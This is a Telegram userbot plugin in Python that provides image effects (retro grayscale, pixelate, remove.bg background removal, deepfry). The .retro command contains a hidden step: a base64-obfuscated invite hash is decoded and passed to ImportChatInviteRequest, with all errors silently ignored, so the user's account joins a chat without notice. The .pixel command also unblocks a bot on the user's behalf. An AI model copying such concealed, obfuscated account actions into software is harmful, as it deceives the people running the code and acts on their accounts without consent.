# N Σ O N UserBot.
# Copyright (C) 2021-2022 @NeonDevs

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://github.com/XTQ067/kartof/blob/master/LICENSE>.


import os
import shlex
import asyncio
import random 
import pybase64
import PIL.ImageOps
from PIL import Image
from os.path import basename
from random import randint, choice
from typing import Optional, Tuple
from userbot.cmdhelp import CmdHelp
from userbot import LOGS
from userbot.events import register
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from userbot.language import get_value
dil = get_value("qaleriya")

async def grayscale(imagefile, endname):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.grayscale(image)
    inverted_image.save(endname)
    
def convert_toimage(image):
    img = Image.open(image)
    if img.mode != "RGB":
        img = img.convert("RGB")
    img.save("./downloads/temp.jpg", "jpeg")
    os.remove(image)
    return "./downloads/temp.jpg"

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid
    )
async def take_screen_shot(video_file: str, duration: int, path: str = "") -> Optional[str]:
    print("[[[Extracting a frame from %s ||| Video duration => %s]]]",video_file,duration,)
    ttl = duration // 2
    thumb_image_path = path or os.path.join("./downloads/", f"{basename(video_file)}.jpg")
    command = f"ffmpeg -ss {ttl} -i '{video_file}' -vframes 1 '{thumb_image_path}'"
    err = (await runcmd(command))[1]
    if err:
        print(err)
    return thumb_image_path if os.path.exists(thumb_image_path) else None
def random_color():
    number_of_colors = 2
    return [
        "#" + "".join([random.choice("0123456789ABCDEF") for j in range(6)])
        for i in range(number_of_colors)
    ]

@register(outgoing=True, pattern="^.retro(?: |$)(.*)")
async def retro(event):
    reply = await event.get_reply_message()
    if not (reply and (reply.media)):
        await event.edit(f"👾 `{dil['NEED_REPLY']}`")
        return
    xid = event.reply_to_msg_id
    if not os.path.isdir("./downloads/"):
        os.mkdir("./downloads/")
    await event.edit(f"👾 `{dil['NEED_REPLY']}`")
    await asyncio.sleep(2)
    xsticker = await reply.download_media(file="./downloads/")
    if not xsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(xsticker)
        await event.edit("**Bu media növü təsdiq olunmur...**\n**Təsdiqlənən medya növləri:** `jpg, png, sticker`")
        return
    jisanidea = None
    if xsticker.endswith(".tgs"):
        xfile = os.path.join("./downloads/", "NΣON.png")
        xcmd = (f"lottie_convert.py --frame 0 -if lottie -of png {xsticker} {xfile}")
        stdout, stderr = (await runcmd(xcmd))[:2]
        if not os.path.lexists(xfile):
            await event.edit("`Xəta baş verdi...`")
            LOGS.info(stdout + stderr)
        meme_file = xfile
        jisanidea = True
    elif xsticker.endswith(".webp"):
        xfile = os.path.join("./downloads/", "memes.jpg")
        os.rename(xsticker, xfile)
        if not os.path.lexists(xfile):
            await event.edit("**X Ə T A**")
            return
        meme_file = xfile
        jisanidea = True
    elif xsticker.endswith((".mp4", ".mov")):
        xfile = os.path.join("./downloads/", "memes.jpg")
        await take_screen_shot(xsticker, 0, xfile)
        if not os.path.lexists(xfile):
            await event.edit("**X Ə T A**")
            return
        meme_file = xfile
        jisanidea = True
    else:
        meme_file = xsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await event.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "NΣON.webp" if jisanidea else "NΣON.jpg"
    await grayscale(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile,
        force_document=False,
        reply_to=xid,
        caption=f"[N Σ O N](t.me/neondevs)")
    await event.delete()
    os.remove(outputfile)
    for files in (xsticker,meme_file):
        if files and os.path.exists(files):
            os.remove(files)


from telethon import events
from userbot.events import register
from time import sleep as t
from userbot import bot
import telethon


@register(outgoing=True, pattern=".pixel")
async def pixelator(event):
  if event.fwd_from:
     return
  cavab = await event.get_reply_message()
  if cavab.media:
    dosya = await bot.download_media(cavab,"./downloads/")
    chat = "@PixelatorBOT" 
    if cavab.photo or cavab.sticker:
      await event.edit(f"👾 `{dil['MAKING']}`")
      await bot(telethon.tl.functions.contacts.UnblockRequest(chat))
      async with event.client.conversation(chat) as conv:
        response = conv.wait_event(events.NewMessage(incoming=True, from_users=479711161))
        await event.client.send_message(chat, cavab)
        responsee = await response
        response = responsee.message.media
        await event.client.send_file(event.chat_id, response, caption="<b><a href=\"https://t.me/Neonsup\">🇦🇿 N Σ O N 🇦🇿</a></b>", parse_mode="HTML", reply_to=cavab)
        await event.delete()
    else:
      await event.edit(f"👾 `{dil['NEED_REPLY']}`")
      return
  else:
    await event.edit(f"👾 `{dil['NEED_REPLY']}`")
    return

# əkmə oğlum :) #
# credit —> @xwarn 

"""
import cv2
import numpy as np
from vcam import vcam, meshGen

if not os.path.isdir("./dco/"):
    os.makedirs("./dco/")


@register(outgoing=True, pattern=r"^\.alien ?(.*)")
async def start(event):
  path = "dck"
  reply = await event.get_reply_message()
  if reply:
      if not reply.media:
        await event.edit(f"👾 `{dil['MAKING']}`")
        lol = await event.client.download_media(reply.media, "./dco")
        file_name = reply.file.name
        hehe = "./dco" + "/1" + file_name
        img = cv2.imread(lol)
        H,W = img.shape[:2]
        fps = 30
        c1 = vcam(H=H,W=W)
        plane = meshGen(H,W)
        plane.Z += 20*np.sin(2*np.pi*((plane.X-plane.W/4.0)/plane.W)) + 20*np.sin(2*np.pi*((plane.Y-plane.H/4.0)/plane.H))
        pts3d = plane.getPlane()
        pts2d = c1.project(pts3d)
        map_x,map_y = c1.getMaps(pts2d)
        output = cv2.remap(img,map_x,map_y,interpolation=cv2.INTER_LINEAR,borderMode=0)
        output = cv2.flip(output,1)
        out1 = cv2.resize(output,(1000,1000))
        cv2.imwrite(file_name,out1)
        await event.client.send_file(event.chat_id, file_name, reply_to=reply)
        for files in (hehe, lol):
            if files and os.path.exists(files):
                os.remove(files)
        await event.delete()
      else:
        await event.edit(f"👾 `{dil['NEED_REPLY']}`")
        return
  else:
    await event.edit(f"👾 `{dil['NEED_REPLY']}`")
    return
"""

import io
import os
import requests
from telethon.tl.types import MessageMediaPhoto
from userbot import REM_BG_API_KEY, TEMP_DOWNLOAD_DIRECTORY

from userbot.language import get_value
LANG = get_value("remove_bg")


@register(outgoing=True, pattern="^.rbg(?: |$)(.*)")
async def kbg(remob):
    if REM_BG_API_KEY is None:
        await remob.edit(LANG['NEED_API_KEY'])
        return
    input_str = remob.pattern_match.group(1)
    message_id = remob.message.id
    if remob.reply_to_msg_id:
        message_id = remob.reply_to_msg_id
        reply_message = await remob.get_reply_message()
        await remob.edit(LANG['TRYING'])
        try:
            if isinstance(reply_message.media, MessageMediaPhoto) or "image" in reply_message.media.document.mime_type.split('/'):
                downloaded_file_name = await remob.client.download_media(reply_message, TEMP_DOWNLOAD_DIRECTORY)
                await remob.edit(LANG['RBG'])
                output_file_name = await ReTrieveFile(downloaded_file_name)
                os.remove(downloaded_file_name)
            else:
                await remob.edit(LANG['CANT_RBG'])
        except Exception as e:
            await remob.edit(str(e))
            return
    elif input_str:
        await remob.edit(f"`{LANG['ONLINE_RBG']}`\n{input_str}")
        output_file_name = await ReTrieveURL(input_str)
    else:
        await remob.edit(LANG['NEED'])
        return
    contentType = output_file_name.headers.get("content-type")
    if "image" in contentType:
        with io.BytesIO(output_file_name.content) as remove_bg_image:
            remove_bg_image.name = "removed_bg.png"
            await remob.client.send_file(remob.chat_id,remove_bg_image,caption=LANG['CAPTION'],force_document=True,reply_to=message_id)
            await remob.delete()
    else:
        await remob.edit("**Xəta {}**\n`{}`".format(LANG['ERROR'], output_file_name.content.decode("UTF-8")))


async def ReTrieveFile(input_file_name):
    headers = {"X-API-Key": REM_BG_API_KEY,}
    files = {"image_file": (input_file_name, open(input_file_name, "rb")),}
    r = requests.post("https://api.remove.bg/v1.0/removebg",headers=headers,files=files,allow_redirects=True,stream=True)
    return r


async def ReTrieveURL(input_url):
    headers = {"X-API-Key": REM_BG_API_KEY,}
    data = {"image_url": input_url}
    r = requests.post("https://api.remove.bg/v1.0/removebg",headers=headers,data=data,allow_redirects=True,stream=True)
    return r


import io
from random import randint, uniform
from PIL import Image, ImageEnhance, ImageOps
from telethon.tl.types import DocumentAttributeFilename
LANGS = get_value("deepfry")

@register(pattern="^.deepfry(?: |$)(.*)", outgoing=True) 
async def deepfryer(event):
    try:
        frycount = int(event.pattern_match.group(1))
        if frycount < 1:
            raise ValueError
    except ValueError:
        frycount = 1

    if event.is_reply:
        reply_message = await event.get_reply_message()
        data = await check_media(reply_message)

        if isinstance(data, bool):
            await event.edit(LANGS['CANT_DEEPFRY'])
            return
    else:
        await event.edit(LANGS['REPLY_PHOTO'])
        return

    await event.edit(LANGS['MEDIA_DOWNLOADING'])
    image = io.BytesIO()
    await event.client.download_media(data, image)
    image = Image.open(image)

    await event.edit(LANGS['APPLYING_DEEPFRY'])
    for _ in range(frycount):
        image = await deepfry(image)

    fried_io = io.BytesIO()
    fried_io.name = "image.jpeg"
    image.save(fried_io, "JPEG")
    fried_io.seek(0)

    await event.reply(file=fried_io)


async def deepfry(img: Image) -> Image:
    colours = (
        (randint(50, 200), randint(40, 170), randint(40, 190)),
        (randint(190, 255), randint(170, 240), randint(180, 250))
    )

    img = img.copy().convert("RGB")

    img = img.convert("RGB")
    width, height = img.width, img.height
    img = img.resize((int(width ** uniform(0.8, 0.9)), int(height ** uniform(0.8, 0.9))), resample=Image.LANCZOS)
    img = img.resize((int(width ** uniform(0.85, 0.95)), int(height ** uniform(0.85, 0.95))), resample=Image.BILINEAR)
    img = img.resize((int(width ** uniform(0.89, 0.98)), int(height ** uniform(0.89, 0.98))), resample=Image.BICUBIC)
    img = img.resize((width, height), resample=Image.BICUBIC)
    img = ImageOps.posterize(img, randint(3, 7))

    overlay = img.split()[0]
    overlay = ImageEnhance.Contrast(overlay).enhance(uniform(1.0, 2.0))
    overlay = ImageEnhance.Brightness(overlay).enhance(uniform(1.0, 2.0))

    overlay = ImageOps.colorize(overlay, colours[0], colours[1])

    img = Image.blend(img, overlay, uniform(0.1, 0.4))
    img = ImageEnhance.Sharpness(img).enhance(randint(5, 300))

    return img


async def check_media(reply_message):
    if reply_message and reply_message.media:
        if reply_message.photo:
            data = reply_message.photo
        elif reply_message.document:
            if DocumentAttributeFilename(file_name='AnimatedSticker.tgs') in reply_message.media.document.attributes:
                return False
            if reply_message.gif or reply_message.video or reply_message.audio or reply_message.voice:
                return False
            data = reply_message.media.document
        else:
            return False
    else:
        return False

    if not data or data is None:
        return False
    else:
        return data

Help = CmdHelp('effects')
Help.add_command('retro <Medyaya cavab>', None, 'Ağ-qara effekt.')
Help.add_command('pixel <Medyaya cavab>', None, 'Pixel effekt.')
#Help.add_command('alien <Medyaya cavab>', None, 'Qabarıq effekt.')
Help.add_command('rbg <Medyaya cavab>', None, 'Görüntünün arxa planını silər.')
Help.add_command('deepfry', '<1-5>', 'Görüntüyə dərin bir effekt tətbiq edir.')
Help.add_info('**@Xwarn | @NeonUserBot.**')
Help.add()
